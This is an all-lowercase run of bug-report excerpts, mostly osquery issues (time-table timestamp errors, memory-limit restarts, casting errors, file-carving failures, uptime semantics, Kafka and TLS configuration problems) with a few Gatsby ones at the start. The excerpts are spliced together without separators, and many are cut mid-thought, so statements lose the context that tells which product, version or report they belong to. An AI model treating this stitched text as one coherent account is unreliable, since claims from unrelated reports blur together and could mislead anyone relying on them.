query testquery($tag: string) { allcontentjson(filter: { tags: { in: {tag: { eq: $tag}}}}) { totalcount }
``` but i always end up with `null` as the result.
returns a node including `{ field_name: null }`
the dimensions do not match.
i write my pages in markdown
when i forgot the leading slash in the frontmatter's `path` property, like so: ```
path: about-me
then i see an error in the browser in `yarn develop`: ```
typeerror: cannot read property 'frontmatter' of null
``` this error message is not helpful at all
it cost me lots of time
### expected behavior gatsby should show a useful error message like ```
path property in frontmatter of file xyz must have a leading slash
the page only loads partially
presumably, the browser only loads some cached assets but doesn't initialize javascript properly
visually the main image will remain blurred instead of loading fully
or even the first redirect (from `/` to `/en`) might also fail, so it doesn't load the content at all
this happens with my firefox browser but also observed on my chrome
### expected behavior page shouldn't fail to load.
gatsby infers a single type for a singular reference field
### expected behavior gatsby should infer a union type for a singular reference field representing all possible types of the linked entries.
404 page not receiving layout graphql query data ### expected behavior 404 page should receive layout graphql query data as per other pages
osquery> select * from time; weekday = saturday year = 2020 month = 10 day = 31 hour = 12 minutes = 28 seconds = 41 timezone = gmt local_time = 1604147321 <---- same
local_timezone = cet unix_time = 1604147321 <---- same timestamp = sat oct 31 12:28:41 2020 utc datetime = 2020-10-31t12:28:41z iso_8601 = 2020-10-31t12:28:41z
``` ### details
first of all, we have to take into account that `--utc=true` is the default; `--utc=true` says "--utc convert all unix times to utc".
this is the first bit which is confusing/misleading
a unix time is always expressed in utc, there should be no conversion to be done
then we expect that `local_time` is different from `unix_time`, since i'm in cet (currently gmt+1), but it's not like that.
looking at the description of both columns:
- local_time "current local unix time in the system"
- unix_time "current unix time in the system, converted to utc if --utc enabled" starting from `local_time`, again a "local unix time" is not 100% clear
a unix time is utc, maybe the description should say "current time in seconds since epoch, adjusted by the local timezone"
it's not a unix time anymore, they are just seconds since the epoch plus (or minus) the seconds of the timezone
then looking at the `unix_time` description, as we've already seen earlier, there should be no conversion needed, especially since the value for that column comes from `std::time()`
on top of all this, even if we interpreted `local_time` with the corrected description, it still doesn't contain the correct value.
even changing `--utc=false` doesn't matter, doing so only changes the `timezone` and the broken down date (the hour, minutes, seconds part).
looking at the code the issue is here:
#l43-l45
(the `local_time` variable is the result of calling `std::time()`)
the `std::mktime` function is taking a `tm` structure which considers to be in local time, and transforms it back to a `time_t` value in utc.
the issue is that it doesn't keep the time unchanged, with the local timezone offset, but it adjusts it back to utc using the local timezone by subtracting local timezone offset from the value
this is not the representation we want
one way to fix this would be to trick `mktime` to think that the `tm` structure we pass instead of being in local time, it's actually in utc already, therefore no adjustment will be made.
the problem with this is that taking the current timezone it's a bit long winded and setting a new one needs you to change environment variables
an alternative is to use `timegm()`, which takes a `tm` structure, considers it being in utc time, and converts it into a `time_t`
### summary:
1) `--utc=true` description is a bit confusing, unix time should not need no conversion, what it ends up changing for the `time` table is only the broken down representation of the date/time, which is not a unix time
maybe it should just refer to "time" in general, but it\'s also difficult to understand which times is supposed to affect.
2) the description of the `unix_time` column is confusing, because a unix time should not need no conversion.
3) the description of the `local_time` column is confusing, again due to the mention of a "local unix time".
4) the `local_time` value is incorrect if we expect that to be a timestamp, which represent the seconds since the epoch, adjusted by the timezone.
osquery sends the next block.
carve request id is the name of the most recent **distributed** query that osqueryd executed (even though that query is no longer executing, and even if that query did not even use the `carves` table).
the queries show an inconsistent number of 4624 events exist in the 'security' event channel
this is repeatable with other event codes as well.
`data = {"data":""}`
hangs indefinitely
build failing.
'cosine_similarity' column is empty
logs on cli: powershell_events.cpp:120] invalid character frequency map found, skipping computation further, on debugging across osquery versions, it was observed that this issue is not there is osquery version 3.2.6
it occurs osquery version 3.3.0 onwards
further analysis of code revealed that kcharfreqvectorlen is now 256
it was 255 in version 3.2.6
but in default osquery.conf, "feature_vectors" elements are 255 only
adding one more entry to the vector resolves the issue
example config can be modified to have 256 elements in "feature_vectors"
some obfuscation scripts for cosine_similarity can be referred from here:
looks like an overflow results in an incorrect value
i saw table not found errors.
![image](
nothing is printed.
osquery> select e.name, e.identifier, e.version, e.description, e.path, "safari" as browser from users u join safari_extensions e on e.uid = u.uid;
osquery consuming the remaining space on my hard drive
i didn't save the logs for when it consumed disk space for the lutris games, but i did this time around: ``` text
may 24 10:55:56 tinolinuxdesktop osqueryd[36963]: i0524 10:55:56.419353 36963 database.cpp:563] checking database version for migration
may 24 10:55:59 tinolinuxdesktop osqueryd[36963]: i0524 10:55:59.723407 36963 config.cpp:738] update
may 24 10:55:59 tinolinuxdesktop osqueryd[36963]: w0524 10:55:59.752830 36963 filesystem.cpp:292] symlink loop detected possibly involving: /home/martinojones/themes/macos/gtk-3.0/gtk-3.20/assets
may 24 10:55:59 tinolinuxdesktop audit: config_change op=set audit_pid=36963 old=1039 auid=4294967295 ses=4294967295 subj=system_u:system_r:unconfined_service_t:s0 res=0
may 24 10:55:59 tinolinuxdesktop osqueryd[36963]: w0524 10:55:59.777324 36963 inotify.cpp:94] failed to do stat on: /opt/bin/
may 24 10:55:59 tinolinuxdesktop osqueryd[36963]: w0524 10:55:59.777386 36963 inotify.cpp:94] failed to do stat on: /opt/sbin/
may 24 10:55:59 tinolinuxdesktop osqueryd[36963]: w0524 10:55:59.784438 36963 filesystem.cpp:292] symlink loop detected possibly involving: /home/martinojones/themes/macos/gtk-3.0/gtk-3.20/assets
may 24 10:56:02 tinolinuxdesktop osqueryd[1110]: osqueryd worker (36963) stopping: total memory limit exceeded: 513936000
may 24 10:56:02 tinolinuxdesktop osqueryd[1110]: w0524 10:56:02.363189 1147 watcher.cpp:338] osqueryd worker (36963) stopping: total memory limit exceeded: 513936000
may 24 10:56:06 tinolinuxdesktop osqueryd[37034]: i0524 10:56:06.028585 37034 database.cpp:563] checking database version for migration
may 24 10:56:09 tinolinuxdesktop osqueryd[37034]: i0524 10:56:09.479640 37034 config.cpp:738] update
may 24 10:56:09 tinolinuxdesktop osqueryd[37034]: w0524 10:56:09.506316 37034 filesystem.cpp:292] symlink loop detected possibly involving: /home/martinojones/themes/macos/gtk-3.0/gtk-3.20/assets
may 24 10:56:09 tinolinuxdesktop audit: config_change op=set audit_pid=37034 old=1039 auid=4294967295 ses=4294967295 subj=system_u:system_r:unconfined_service_t:s0 res=0
may 24 10:56:09 tinolinuxdesktop osqueryd[37034]: w0524 10:56:09.526803 37034 inotify.cpp:94] failed to do stat on: /opt/bin/
may 24 10:56:09 tinolinuxdesktop osqueryd[37034]: w0524 10:56:09.526850 37034 inotify.cpp:94] failed to do stat on: /opt/sbin/
may 24 10:56:09 tinolinuxdesktop osqueryd[37034]: w0524 10:56:09.531414 37034 filesystem.cpp:292] symlink loop detected possibly involving: /home/martinojones/themes/macos/gtk-3.0/gtk-3.20/assets
may 24 10:56:11 tinolinuxdesktop osqueryd[1110]: osqueryd worker (37034) stopping: total memory limit exceeded: 513940000
may 24 10:56:11 tinolinuxdesktop osqueryd[1110]: w0524 10:56:11.966634 1147 watcher.cpp:338] osqueryd worker (37034) stopping: total memory limit exceeded: 513940000
may 24 10:56:15 tinolinuxdesktop osqueryd[37077]: i0524 10:56:15.632820 37077 database.cpp:563] checking database version for migration
may 24 10:56:18 tinolinuxdesktop osqueryd[37077]: i0524 10:56:18.966058 37077 config.cpp:738] update
may 24 10:56:18 tinolinuxdesktop osqueryd[37077]: w0524 10:56:18.995513 37077 filesystem.cpp:292] symlink loop detected possibly involving: /home/martinojones/themes/macos/gtk-3.0/gtk-3.20/assets
may 24 10:56:19 tinolinuxdesktop audit: config_change op=set audit_pid=37077 old=1039 auid=4294967295 ses=4294967295 subj=system_u:system_r:unconfined_service_t:s0 res=0
may 24 10:56:19 tinolinuxdesktop osqueryd[37077]: w0524 10:56:19.015600 37077 inotify.cpp:94] failed to do stat on: /opt/bin/
may 24 10:56:19 tinolinuxdesktop osqueryd[37077]: w0524 10:56:19.015642 37077 inotify.cpp:94] failed to do stat on: /opt/sbin/
may 24 10:56:19 tinolinuxdesktop osqueryd[37077]: w0524 10:56:19.020082 37077 filesystem.cpp:292] symlink loop detected possibly involving: /home/martinojones/themes/macos/gtk-3.0/gtk-3.20/assets
may 24 10:56:21 tinolinuxdesktop osqueryd[1110]: osqueryd worker (37077) stopping: total memory limit exceeded: 513944000
may 24 10:56:21 tinolinuxdesktop osqueryd[1110]: w0524 10:56:21.570999 1147 watcher.cpp:338] osqueryd worker (37077) stopping: total memory limit exceeded: 513944000
may 24 10:56:25 tinolinuxdesktop osqueryd[37130]: i0524 10:56:25.215157 37130 database.cpp:563] checking database version for migration
may 24 10:56:28 tinolinuxdesktop osqueryd[37130]: i0524 10:56:28.511364 37130 config.cpp:738] update
for some items "path" & "args" columns filled in incorrectly: 2nd part of the path (after 1st space symbol in it) moved to "args" column
the issue seems to be valid for items from registry, which have a space symbol in value data and are unquoted.
example: ![image](
linux and windows do not account for the paused time, macos does
looking at the code, this is clearly caused by the fact that while linux and windows retrieve an uptime directly, which is only updated when the vm is actually running, macos uptime is calculated from the boot time, so a fixed point in time.
this then causes issues like the one we see in where there's a check that verifies that the start time of a process in windows is <= than now and >= than the boot time.
though the boot time is calculated using the getuptime() api, so especially on the ci where they have pre-generated vms, the start time process can result to be older than the calculated boot time
i think we have to decide what meaning to give to getuptime.
i still haven't checked if there's a reliable way on macos to get the uptime as it works on linux or windows or if we have to find a way to get the boot time on all platforms and subtract it from the current time
at the same time there\'s a fun part in windows where, due to "fast startup", the boot time can be "unreliable" too.
one of the best ways to query it seems to be via wmi, though that value is not updated if windows has been booted with "fast startup" on; this means that it doesn\'t really capture the "real" boot time and so the uptime calculated via that value would contain the time where the machine has been off, like if it has been a vm in paused state.
this again would be similar to the linux and macos case, when using their boot time timestamps, but then is less connected to the concept of "system boot"
so questions:
1) what meaning do we want to give to "uptime", in relation to what has been said above?
2) what to do with the windows boot time concept?
service fails with the message below
adding `--verbose` to the flags file does not include any additional information
$ sudo systemctl status osqueryd
osqueryd.service - the osquery daemon loaded: loaded (/usr/lib/systemd/system/osqueryd.service; disabled; vendor preset: enabled) drop-in: /etc/systemd/system/osqueryd.service.d rotectsystem.conf active: failed (result: exit-code) since wed 2020-04-08 16:07:03 utc; 10s ago process: 2016 execstartpre=/bin/sh -c if [ ! -f $config_file ]; then echo {} > $config_file; fi (code=exited, status=2) apr 08 16:07:03 ubuntu-bionic systemd[1]: osqueryd.service: service hold-off time over, scheduling restart.
apr 08 16:07:03 ubuntu-bionic systemd[1]: osqueryd.service: scheduled restart job, restart counter is at 5.
apr 08 16:07:03 ubuntu-bionic systemd[1]: stopped the osquery daemon.
apr 08 16:07:03 ubuntu-bionic systemd[1]: osqueryd.service: start request repeated too quickly.
apr 08 16:07:03 ubuntu-bionic systemd[1]: osqueryd.service: failed with result 'exit-code'.
apr 08 16:07:03 ubuntu-bionic systemd[1]: failed to start the osquery daemon.
``` most interestingly, if the service is started one time without the `protectsystem=strict` option, it seems to perform some sort of initialization that allows the option to be enabled later with no other changes
for example, from a fresh vm: ```
sudo apt update && sudo apt upgrade -y
curl -l -o osquery.deb
sudo dpkg -i osquery.deb
sudo mkdir /etc/systemd/system/osqueryd.service.d
cat << eof | sudo tee /etc/systemd/system/osqueryd.service.d/protectsystem.conf
protectsystem=strict
readwritepaths=/var/osquery /var/run /var/tmp /tmp eof
sudo systemctl daemon-reload
sudo systemctl start osqueryd
# this fails sudo mv /etc/systemd/system/osqueryd.service.d/protectsystem.conf /tmp
sudo systemctl daemon-reload
sudo systemctl start osqueryd # this is successful sudo systemctl stop osqueryd
sudo mv /tmp/protectsystem.conf /etc/systemd/system/osqueryd.service.d/protectsystem.conf
sudo systemctl daemon-reload
sudo systemctl start osqueryd
# now this works
i was not able to get the cmdline and the elapsed time in macos, it was all around the place.
osquery> select pid, name, cmdline, uid, elapsed_time from processes where name like "%python%";
+-------+--------+---------+-----+--------------+
| pid | name | cmdline | uid | elapsed_time |
+-------+--------+---------+-----+--------------+
| 42071 | python | | 502 | 521 |
+-------+--------+---------+-----+--------------+
osquery> select pid, name, cmdline, uid, elapsed_time from processes where name like "%python%";
+-------+--------+---------+-----+--------------+
| pid | name | cmdline | uid | elapsed_time |
+-------+--------+---------+-----+--------------+
| 42071 | python | | 502 | 0 |
+-------+--------+---------+-----+--------------+
osquery> select pid, name, cmdline, uid, elapsed_time from processes where name like "%python%";
+-------+--------+---------+-----+---------------------+
| pid | name | cmdline | uid | elapsed_time |
+-------+--------+---------+-----+---------------------+
| 42071 | python | | 502 | 7306086829599451492 |
+-------+--------+---------+-----+---------------------+
linux was able to get the `cmdline` but not the elapsed time.
$ osqueryi "select pid, name, cmdline, uid, elapsed_time from processes where name like \\"%python%\\";"
+-------+---------+------------------------+------+--------------+
| pid | name | cmdline | uid | elapsed_time |
+-------+---------+------------------------+------+--------------+
| 15791 | python3 | python3 -m http.server | 1002 | |
+-------+---------+------------------------+------+--------------+
with no error on macos and the following error in linux
i0325 14:51:24.857920 16390 dynamic_table_row.cpp:123] error casting elapsed_time () to bigint
three entries for each installed chrome extension.
the queries do not execute at all
depending on the context, i have seen this manifest with some queries executing
in this case they did not seem to execute at all
compare this to the same config with intervals added to each query: ```
$ cat /users/zwass/dev/test_osquery.conf
{ "options": { "schedule_default_interval": "10", "logger_path": "/tmp/osquery.log", "verbose": true }, "schedule": { "query_1": { "query": "select 1", "interval": 10, "removed": "false" }, "query_2": { "query": "select 2", "interval": 10, "removed": "false" }, "query_3": { "query": "select 3", "interval": 10, "removed": "false" } }
$ osqueryd --pidfile /tmp/osquery.pid --database_path /tmp/osquery.db --config_path /users/zwass/dev/test_osquery.conf
e0322 15:39:16.637606 342607296 init.cpp:564] an error occured during extension manager startup: cannot create extension socket: /var/osquery/osquery.em
i0322 15:39:16.641007 342607296 options.cpp:100] verbose logging enabled by config option
i0322 15:39:16.641494 342607296 events.cpp:863] event publisher not enabled: openbsm: publisher disabled via configuration
i0322 15:39:16.641769 342607296 events.cpp:863] event publisher not enabled: scnetwork: publisher not used
i0322 15:39:16.641827 342607296 events.cpp:863] event publisher not enabled: event_tapping: publisher disabled via configuration
i0322 15:39:16.685813 342607296 main.cpp:103] not starting the distributed query service: distributed query service not enabled.
i0322 15:39:16.685832 203956224 events.cpp:784] starting event publisher run loop: diskarbitration
i0322 15:39:16.685835 205029376 events.cpp:784] starting event publisher run loop: iokit
i0322 15:39:16.685839 204492800 events.cpp:784] starting event publisher run loop: fsevents
i0322 15:39:20.698709 205565952 scheduler.cpp:96] executing scheduled query query_2: select 2
i0322 15:39:20.702929 205565952 scheduler.cpp:96] executing scheduled query query_3: select 3
i0322 15:39:22.703976 205565952 scheduler.cpp:96] executing scheduled query query_1: select 1
i0322 15:39:30.724493 205565952 scheduler.cpp:96] executing scheduled query query_2: select 2
i0322 15:39:31.129132 205565952 scheduler.cpp:96] executing scheduled query query_3: select 3
i0322 15:39:33.731251 205565952 scheduler.cpp:96] executing scheduled query query_1: select 1
i0322 15:39:40.751235 205565952 scheduler.cpp:96] executing scheduled query query_2: select 2
i0322 15:39:40.753957 205565952 scheduler.cpp:96] executing scheduled query query_3: select 3
i0322 15:39:44.758416 205565952 scheduler.cpp:96] executing scheduled query query_1: select 1
``` each query executes about every 10 seconds.
i saw this for multiple tables, but this is the pattern: `error casting $column () to $type` i'll try to list the tables below..
--- querying `interface_details` on linux:
i0303 12:49:21.993166 192253952 dynamic_table_row.cpp:114] error casting enabled () to integer
i0303 12:49:21.993263 192253952 dynamic_table_row.cpp:114] error casting physical_adapter () to integer
i0303 12:49:21.993315 192253952 dynamic_table_row.cpp:114] error casting speed () to integer
i0303 12:49:21.993362 192253952 dynamic_table_row.cpp:114] error casting dhcp_enabled () to integer
``` table `usb_devices` (macos):
i0303 10:43:10.491322 192253952 scheduler.cpp:96] executing scheduled query pack_somepack_usb-devices: select usb.* from usb_devices as usb;
i0303 10:43:10.494263 192253952 dynamic_table_row.cpp:114] error casting usb_address () to integer
``` table `interface_details` (macos):
i0303 12:49:21.990605 192253952 scheduler.cpp:96] executing scheduled query pack_somepack_network-interface-changes: select interface, mac, type, mtu, ierrors, oerrors, idrops, odrops, last_change, description, manufacturer, connection_id, connection_status, enabled, physical_adapter, speed, dhcp_enabled, dhcp_lease_expires, dhcp_lease_obtained, dhcp_server, dns_domain, dns_domain_suffix_search_order, dns_host_name, dns_server_search_order from interface_details;
i0303 12:49:21.993166 192253952 dynamic_table_row.cpp:114] error casting enabled () to integer
i0303 12:49:21.993263 192253952 dynamic_table_row.cpp:114] error casting physical_adapter () to integer
i0303 12:49:21.993315 192253952 dynamic_table_row.cpp:114] error casting speed () to integer
i0303 12:49:21.993362 192253952 dynamic_table_row.cpp:114] error casting dhcp_enabled () to integer
``` tables `hash`, `process_events`, `users`, `groups` (macos):
i0303 10:49:29.274178 192253952 scheduler.cpp:96] executing scheduled query pack_somepack_audit-process-events: select h.md5, p.path, p.cmdline, p.cwd, p.gid, p.egid, p.uid, p.euid, p.pid, p.parent, p.time, u.username, eu.username as e_username, g.groupname, eg.groupname as e_groupname from
hash as h, process_events as p, users as u, groups as g join users as eu on p.euid=eu.uid join groups as eg on p.egid=eg.gid where h.path = p.path and u.uid = p.uid and g.gid = p.gid and p.cmdline not like "%docker-credentials%" group by h.md5;
i0303 10:49:29.317302 192253952 user_groups.mm:56] error with opendirectory results: an invalid attribute type was provided.
i0303 10:51:07.342941 192253952 user_groups.mm:56] error with opendirectory results: an invalid attribute type was provided.
i0303 10:51:07.751210 192253952 user_groups.mm:56] error with opendirectory results: an invalid attribute type was provided.
i0303 10:51:08.365211 192253952 user_groups.mm:56] error with opendirectory results: an invalid attribute type was provided.
i0303 10:51:08.775454 192253952 user_groups.mm:56] error with opendirectory results: an invalid attribute type was provided.
i0303 10:51:08.775894 192253952 dynamic_table_row.cpp:123] error casting parent () to bigint
i0303 10:51:09.383039 192253952 user_groups.mm:56] error with opendirectory results: an invalid attribute type was provided.
i0303 10:51:09.790145 192253952 user_groups.mm:56] error with opendirectory results: an invalid attribute type was provided.
i0303 10:51:09.790694 192253952 dynamic_table_row.cpp:123] error casting parent () to bigint
i0303 10:51:10.409380 192253952 user_groups.mm:56] error with opendirectory results: an invalid attribute type was provided.
i0303 10:51:10.813109 192253952 user_groups.mm:56] error with opendirectory results: an invalid attribute type was provided.
``` table `process_open_sockets` (macos): ```
i0303 12:51:56.315275 192253952 scheduler.cpp:96] executing scheduled query pack_somepack_netstat: select pos.socket from process_open_sockets as pos;
i0303 12:51:56.329641 192253952 dynamic_table_row.cpp:123] error casting socket (17500881079293304539) to bigint
``` table `docker_containers`, `docker_container_stats` (macos): ```
i0303 13:56:40.996515 192253952 scheduler.cpp:96] executing scheduled query pack_somepack_docker-container-stats: select * from docker_containers as dc join docker_container_stats as dcs on dc.id=dcs.id;
i0303 13:56:42.775250 192253952 dynamic_table_row.cpp:114] error casting pids (^q) to integer
``` tables `users`, `account_policy_data` (macos): ```
i0303 13:57:56.043328 192253952 scheduler.cpp:96] executing scheduled query pack_somepack_failed-local-logins: select * from users join account_policy_data using (uid) where failed_login_count > 0;
i0303 13:57:56.226645 192253952 dynamic_table_row.cpp:123] error casting failed_login_count () to bigint
dropped in osquery interactive vs help
# osqueryi -h |grep config_check --config_check check the format of an osquery config and exit
three identical result rows per chrome extension.
errors for path/cwd retrieval for minimal processes stdout for system:
{ "cmdline": "", "cwd": "", "disk_bytes_read": "855786099", "disk_bytes_written": "5060163135", "egid": "-1", "elapsed_time": "922700", "euid": "-1", "gid": "-1", "handle_count": "6593", "is_elevated_token": "-1", "name": "system", "nice": "32", "on_disk": "-1", "parent": "0", "path": "", "percent_processor_time": "218557031250", "pgroup": "-1", "pid": "4", "resident_size": "4849664", "root": "", "sgid": "-1", "start_time": "1581388109", "state": "still_active", "suid": "-1", "system_time": "21855703", "threads": "272", "total_size": "180224", "uid": "-1", "user_time": "0", "wired_size": "136"
``` stdout for memory compression:
{ "cmdline": "", "cwd": "", "disk_bytes_read": "0", "disk_bytes_written": "0", "egid": "-1", "elapsed_time": "922684", "euid": "-1", "gid": "18", "handle_count": "0", "is_elevated_token": "1", "name": "memory compression", "nice": "32", "on_disk": "-1", "parent": "4", "path": "", "percent_processor_time": "2294375000", "pgroup": "-1", "pid": "3376", "resident_size": "742686720", "root": "", "sgid": "-1", "start_time": "1581388125", "state": "still_active", "suid": "-1", "system_time": "229437", "threads": "26", "total_size": "2359296", "uid": "18", "user_time": "0", "wired_size": "0"
``` errors for system (pid 4):
e0221 10:46:49.369086 17848 processes.cpp:312] failed to lookup path information for process 4
e0221 10:46:49.369086 17848 processes.cpp:332] failed to get cwd for 4 with 31
``` errors for memory compression (pid 3376)
e0221 10:46:49.483389 17848 processes.cpp:312] failed to lookup path information for process 3376
e0221 10:46:49.499433 17848 processes.cpp:332] failed to get cwd for 3376 with 31
``` also may be useful for future versions of osquery to include a column for whether or not a process is a minimal process.
it's easiest to see in these logs:
i0218 20:15:59.209110 1 init.cpp:418] osquery initialized [version=4.1.2]
i0218 20:16:00.242827 1 system.cpp:362] writing osqueryd pid (1) to /var/run/osqueryd.pidfile
i0218 20:16:00.243101 1 extensions.cpp:349] could not autoload extensions: failed reading: /etc/osquery/extensions.load
i0218 20:16:00.245105 7 watcher.cpp:583] osqueryd watcher (1) executing worker (8)
i0218 20:16:00.272356 8 init.cpp:415] osquery worker initialized [watcher=1]
i0218 20:16:00.272872 8 rocksdb.cpp:131] opening rocksdb handle: /var/osquery/osquery.db
i0218 20:16:00.299070 8 auto_constructed_tables.cpp:93] removing stale atc entries
i0218 20:16:00.299257 15 interface.cpp:268] extension manager service starting: /var/osquery/osquery.em
i0218 20:16:00.300686 8 tls.cpp:253] tls/https post request to uri:
i0218 20:16:00.384652 8 events.cpp:863] event publisher not enabled: auditeventpublisher: publisher disabled via configuration
i0218 20:16:00.384747 8 events.cpp:863] event publisher not enabled: syslog: publisher disabled via configuration
i0218 20:16:00.384958 8 events.cpp:1122] error registering subscriber: process_file_events: subscriber disabled via configuration
i0218 20:16:00.385128 8 events.cpp:1122] error registering subscriber: selinux_events: subscriber disabled via configuration
i0218 20:16:00.385644 8 events.cpp:1122] error registering subscriber: socket_events: subscriber disabled via configuration
i0218 20:16:00.386554 19 events.cpp:784] starting event publisher run loop: inotify
i0218 20:16:00.386853 20 events.cpp:784] starting event publisher run loop: udev
i0218 20:16:00.387841 21 tls.cpp:253] tls/https post request to uri:
i0218 20:16:03.375351 18 tls.cpp:253] tls/https post request to uri:
i0218 20:16:03.429100 21 tls.cpp:253] tls/https post request to uri:
i0218 20:16:06.453423 18 tls.cpp:253] tls/https post request to uri:
i0218 20:16:06.469575 21 tls.cpp:253] tls/https post request to uri:
i0218 20:16:09.512351 18 tls.cpp:253] tls/https post request to uri:
i0218 20:16:09.517890 21 tls.cpp:253] tls/https post request to uri:
i0218 20:16:12.560744 21 tls.cpp:253] tls/https post request to uri:
i0218 20:16:12.560842 18 tls.cpp:253] tls/https post request to uri:
i0218 20:16:15.613683 21 tls.cpp:253] tls/https post request to uri:
i0218 20:16:15.613822 18 tls.cpp:253] tls/https post request to uri:
i0218 20:16:18.673636 18 tls.cpp:253] tls/https post request to uri:
i0218 20:16:18.676255 21 tls.cpp:253] tls/https post request to uri:
i0218 20:16:21.734619 21 tls.cpp:253] tls/https post request to uri:
i0218 20:16:21.736323 18 tls.cpp:253] tls/https post request to uri:
i0218 20:16:24.785765 18 tls.cpp:253] tls/https post request to uri:
i0218 20:16:24.787811 21 tls.cpp:253] tls/https post request to uri:
i0218 20:16:27.836035 18 tls.cpp:253] tls/https post request to uri:
i0218 20:16:27.837741 21 tls.cpp:253] tls/https post request to uri:
i0218 20:16:30.301290 16 config.cpp:1140] refreshing configuration state
i0218 20:16:30.302026 16 tls.cpp:253] tls/https post request to uri:
i0218 20:16:30.354585 16 config.cpp:489] normal configuration delay restored
i0218 20:16:30.895099 18 tls.cpp:253] tls/https post request to uri:
i0218 20:16:30.902052 21 tls.cpp:253] tls/https post request to uri:
i0218 20:16:33.355458 16 config.cpp:1140] refreshing configuration state
i0218 20:16:33.355888 16 tls.cpp:253] tls/https post request to uri:
i0218 20:16:33.946292 21 tls.cpp:253] tls/https post request to uri:
i0218 20:16:33.953974 18 tls.cpp:253] tls/https post request to uri:
i0218 20:16:36.401840 16 config.cpp:1140] refreshing configuration state
i0218 20:16:36.402174 16 tls.cpp:253] tls/https post request to uri:
i0218 20:16:37.001600 21 tls.cpp:253] tls/https post request to uri:
i0218 20:16:37.007915 18 tls.cpp:253] tls/https post request to uri:
``` see that osquery immediately begins using the 3 second interval for distributed read and logging (so we know it loaded the config from tls)
it uses a 30 second interval before checking for config again, and after that the 3 second interval is respected
the expected behavior seems to be that the configuration interval is respected on first load of the config.
w0212 16:33:37.699832 448591296 hash.cpp:195] ssdeep failed: /private/var/db/dslocal/nodes/default/sqlindex
{"directory":"/private/var/db/dslocal/nodes/default","md5":"","path":"/private/var/db/dslocal/nodes/default/sqlindex","sha1":"","sha256":"","ssdeep":"-1"}
i saw errors and no data produced for either column, despite confirming the presence of data in the corresponding plist (which the table pulls its data from)
osquery> select network_name, security_type, last_connected, auto_login, captive_portal from wifi_networks where network_name = "jason\'s macbook pro";
i0211 09:09:10.511170 281939392 dynamic_table_row.cpp:114] error casting last_connected () to integer
i0211 09:09:10.511199 281939392 dynamic_table_row.cpp:114] error casting auto_login () to integer
+---------------------+--------------------+----------------+------------+----------------+
| network_name | security_type | last_connected | auto_login | captive_portal |
+---------------------+--------------------+----------------+------------+----------------+
| jason's macbook pro | wpa2/wpa3 personal | | | 0 |
+---------------------+--------------------+----------------+------------+----------------+
an error appeared in the daemon log regarding the `ssl` prefix on the brokers' fqdns.
# journalctl -xe -u osqueryd.service -o verbose --output-fields=message |grep kafka message=e0131 13:49:24.010207 5349 kafka_producer.cpp:91] could not set kafka configuration key \'security.protocol\': invalid value "ssl" for configuration property "security.protocol"
and also, it was the only error, when debugging with `--verbose`
# /usr/bin/osqueryd --ephemeral --database_path /tmp/osquery.db --verbose 2>&1 |grep ^e
e0131 14:50:40.963933 20148 kafka_producer.cpp:91] could not set kafka configuration key \'security.protocol\': invalid value "ssl" for configuration property "security.protocol"
as a result osquery logs were not ingested in the target kafka cluster.
tls results and requests are successfully processed.
a file with size of 1k that contains only \\x00 #### the story
i tried to carve the windows security evtx but it failed so i tried to investigate the reason.
eventually, it seems that osquery can't carve a file with open handle with write permission.
i tried doing the carving using zentral
reproduce the error:
carving a simple txt file worked
trying to carve the same file while using the python open command on it with "w" or "a" flags (f = open(r"c:\\path\\to\\file", flag) ) ended with a 1k file that contains only \\x00
the directory is empty
i think this is because the default path the build script looks for the bundle does not contain certs (at least in the latest chocolatey openssl package): #l667 maybe the script can be configured to use the bundle in the repo?
osquery> .version
osquery 4.1.1
using sqlite 3.29.0
osquery> select count(*) from mdfind, file using(path) where query = "kmditemfsname == \'*.sketch\'";
+----------+
| count(*) |
+----------+
+----------+
osquery> ```
instead, i see no rows for t2 devices
@sharvilshah mentioned in his original pr( that lack of results was a known issue for desktop devices ( #issuecomment-521663431) but it is also failing to return results for t2 macbook pro's
additionally, on these devices i see an error related to embeddedos: >cannot get embeddedos properties ![image](
![image]( i realize this table was significantly rewritten to use embeddedos ( wondering if @sharvilshah, @keeleysam, @terracatta might have input on the possible causes for the issue.
result json encodes numbers in strings ```
{"name":"pack_test_pack_time","hostidentifier":"desktop-us4mmsd","calendartime":"fri nov 22 01:47:25 2019 utc","unixtime":"1574387245","epoch":"0","counter":"728","lognumericsasnumbers":"true","decorations":{"hardware_serial":"0","hostname":"desktop-us4mmsd","uuid":"41fcc197-1ad8-c442-a238-1c27f2bcc7ef"},"columns":{"datetime":"2019-11-22t01:47:25z","day":"22","hour":"1","iso_8601":"2019-11-22t01:47:25z","local_time":"1574387245","local_timezone":"utc","minutes":"47","month":"11","seconds":"25","timestamp":"fri nov 22 01:47:25 2019 utc","timezone":"utc","unix_time":"1574387245","weekday":"friday","win_timestamp":"132188608455002220","year":"2019"},"action":"added","log_type":"result"}
all keyword values are -1, the default set in windows_events.cpp: r["keywords"] = bigint(ec->eventrecord.get("event.system.keywords", -1));
it looks like the keywords value retrieved from the windows event xml (e.g
) can't be cast to a bigint.
exception making http request to url ( invalid url i built my own version of osquery to debug further and found that when osquery attempts to reach this url it receives a 301 redirect to "location: /latest/meta-data/iam/security-credentials/"
it then passes this value as the url to uri which barfs as it doesnt match the expected url format
the follow_redirect logic needs to ensure the location is translated into a proper url.
osquery> select * from hash;
error: no query solution
all my hosts have all these weird status logs coming from them:
first of all when running `--verbose` i keep getting so many of these logs coming all the time:
`failed to open handle to process <num> with 5`
for some time i got this log from all my hosts, about 200 from each a day, and now it went down to 1 a day but i still wonder why it happens:
`error sending status to logger: request failed: invalid node key: authentication error: invalid node key: <node key>`
database plugin keeps resetting - about 10 time a day per host
`resetting the database plugin: rocksdb`
`resetting the database plugin: ephemeral`
hosts just stop communicating with my tls server sometimes.
the process and service are up but the `last_seen` on the server doesn't update
(using kolide fleet) flag file:
allow_unsafe
config_plugin=tls
config_refresh=600
disable_distributed=false
disable_events=false
disable_watchdog=false
distributed_plugin=tls
enable_extension_watchdog
events_expiry=3600
events_max=2500
logger_event_type=true
logger_plugin=tls
pack_delimiter= /
pack_refresh_interval=30
schedule_default_interval=30
verbose=true
watchdog_level=0
### other notes restarting the osquery process results in the behavior being reset
running a distributed query on osqueryd results in only the first query returning results until osqueryd is restarted
running osqueryi in verbose mode did not produce any actionable logs.
system becomes unresponsive.
zero return code, which indicates success
this same behavior applies to running queries programmatically, where getexitcodeprocess(...) (windows api) against a finished osqueryi process will return 0
this presents an issue for being able to determine if a query run in this manner was successful
the only way to determine failure is to inspect stderr and either
1) parse stderr contents - undesirable, as osquery logging can/will change from build-to-build.
